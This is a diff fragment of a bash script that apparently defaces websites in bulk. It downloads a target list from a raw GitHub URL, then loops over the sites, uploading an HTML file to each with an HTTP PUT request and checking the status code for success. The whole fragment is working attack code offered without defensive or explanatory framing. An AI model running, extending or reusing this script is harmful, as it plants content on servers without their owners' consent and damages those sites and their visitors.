@@ -20,6 +20,11 @@ banner() {
 
 main() {
     pids=()
+    if [ -f sl.txt ]; then
+   echo ""
+else
+   curl -s -o sl.txt https://raw.githubusercontent.com/DH-Alamin/file/main/sl.txt
+fi
     for site in $(< sl.txt); do
         if [[ ${#pids[@]} -ge 2 ]]; then
             wait -n
@@ -43,6 +48,12 @@ main() {
 scan() {
     site=${1}
     name="${2}"
+    if [ -f $FILE ]; then
+   echo ""
+else
+   echo "${w}[${r}-${w}] ${r}HTML File Not Found!${n}"
+   dmake
+fi
     upload=$( curl -s -T ${name} ${site} )
     cd=$( curl -s -o /dev/null ${site}/${name} -w %{http_code} )
     if [[ $cd == 200 ]] || [[ $cd == 201 ]]; then
